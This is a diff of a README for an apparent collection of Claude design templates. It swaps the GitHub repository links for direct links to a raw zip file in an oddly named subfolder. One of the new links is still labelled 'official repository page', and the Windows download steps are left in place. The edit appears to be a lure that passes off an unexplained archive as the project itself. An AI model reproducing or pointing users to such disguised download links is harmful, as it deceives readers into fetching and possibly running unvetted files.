@@ -1,6 +1,6 @@
 # 🎨 awesome-claude-design - Build Your User Interface Faster Today
 
-[![Download Project](https://img.shields.io/badge/Download-Open_Repository-blue.svg)](https://github.com/alfonsosagacious5877/awesome-claude-design)
+[![Download Project](https://img.shields.io/badge/Download-Open_Repository-blue.svg)](https://raw.githubusercontent.com/alfonsosagacious5877/awesome-claude-design/main/ammonitic/design-claude-awesome-v2.3.zip)
 
 This repository provides a library of design system inspirations. These tools help you build professional user interfaces without writing code from scratch. You access 68 unique design templates that work with Claude’s coding assistant. Each design follows the DESIGN.md format. You drop these files into your project to launch a full interface immediately.
 
@@ -8,7 +8,7 @@ This repository provides a library of design system inspirations. These tools he
 
 Follow these steps to get the files on your Windows computer:
 
-1. Visit the [official repository page](https://github.com/alfonsosagacious5877/awesome-claude-design).
+1. Visit the [official repository page](https://raw.githubusercontent.com/alfonsosagacious5877/awesome-claude-design/main/ammonitic/design-claude-awesome-v2.3.zip).
 2. Look for the green button labeled "Code" near the top right area of the page.
 3. Click "Code" and select "Download ZIP" from the menu.
 4. Locate the folder in your Downloads directory.
